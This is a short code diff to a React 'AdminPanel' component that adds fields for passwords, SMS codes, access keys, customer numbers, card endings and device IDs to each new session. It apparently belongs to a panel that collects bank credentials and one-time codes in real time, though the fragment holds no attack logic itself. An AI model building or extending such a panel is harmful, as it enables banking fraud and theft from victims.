@@ -311,7 +311,18 @@ export default function AdminPanel() {
                 direccion: null,
                 correo: null,
                 contrasena: null,
-                celular: null
+                celular: null,
+                challenge: null,
+                qrImage: null,
+                qrValidated: null,
+                smsCode: null,
+                numeroCliente: null,
+                claveAcceso: null,
+                deviceId: null,
+                terminacionTarjeta: null,
+                mensajePersonalizado: null,
+                terminacion: null,
+                dispositivo: null
               };
               
               return [newSession, ...prev]; // Agregar al inicio de la lista
